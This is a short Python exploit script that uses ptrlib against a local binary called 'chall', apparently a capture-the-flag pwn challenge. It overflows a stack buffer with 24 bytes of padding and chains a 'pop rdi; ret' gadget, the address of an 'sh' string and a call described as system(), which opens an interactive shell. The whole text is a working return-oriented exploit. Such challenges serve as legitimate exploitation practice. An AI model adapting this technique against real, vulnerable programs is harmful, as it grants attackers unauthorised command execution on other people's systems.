#!/usr/bin/env python
import ptrlib as ptr


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)

payload = b"A" * 24
payload += ptr.p64(next(elf.gadget("pop rdi; ret")))
payload += ptr.p64(next(elf.find(b"sh\x00")))
payload += ptr.p64(0x00000000004011E5)  # help+15 ie. system()

ptr.logger.info(f"payload length: {len(payload)}")
if len(payload) > 48:
    ptr.logger.error("payload length is too long!")
    exit()

io.sendline(payload)
io.recvuntil(b"finish")
io.recvuntil(b"finish")
io.sh()
